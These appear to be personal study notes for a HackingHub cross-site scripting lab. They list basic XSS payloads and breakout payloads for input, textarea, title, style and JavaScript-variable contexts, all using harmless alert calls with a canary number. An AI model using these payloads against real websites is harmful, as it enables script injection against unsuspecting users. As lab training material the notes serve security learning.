# hackinghub  

## xss  
[https://app.hackinghub.io/hubs/nbbc-xss](https://app.hackinghub.io/hubs/nbbc-xss)  

### basic xss  

The number `19628397001` in the examples below is just a random number that can be used as a [canary](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary) to search proxy history for the value.  

Try to start with simple payload like `<h1>19628397001` to see what happens.  

```
<script>alert(19628397001)</script>
<script>alert(19628397001)
<script>alert(19628397001);//</script>
<script>confirm(19628397001);//</script>
<img src=xxxxx onmouseover=alert(19628397001)>
<img src=xxxxx onerror=alert(19628397001)>
<a href=javascript:alert(19628397001)>xsstest</a>
<a href=javascript:alert(19628397001)>xsstest
<iframe src=javascript:alert(19628397001)>
<object data="data:text/html,<script>alert(19628397001)</script>"></object>
<script src="data:text/javascript,alert(19628397001)"></object>
</p><h1><u/onmouseover=alert(1)>19628397001
```  

### contexts  

#### input example  

value inside an input:  
`<input value="19628397001">`  

try to break out with a payload like...    
```
test"><script>alert(19628397001)</script>
```  

or use an event like this...  
```
test" onmouseover=alert(19628397001);//
```  

#### textarea example   

value inside a textarea:  
`<textarea>19628397001</textarea>`  

try to break out with a payload like...  
```
test</textarea><img/src=x onerror=alert(19628397001)>
```  

#### title example  

value inside a title:  
`<title>Welcome, 19628397001</title>`  

try to break out with a payload like...  
```
test</title><img/src=x onerror=alert(19628397001)>
```  

#### style tag in head section  
expected value format `#FFFFFF`, but example below input value (`19628397001`):  
```HTML
<head>
        <style>
                body {
                        background-color: 19628397001;
                }
        </style>
</head>
```  

try to break out with a payload like...  
```
#FFFFFF;}</style><script>alert(19628397001)</script><!--
```

#### javascript variables  

value `19628397001` instead a javascript variable:  
```
<script>
var name = '19628397001';
$('span#name').html( name );
</script>
```

try to break out with a payload like...  
```
';alert(19628397001);//
```
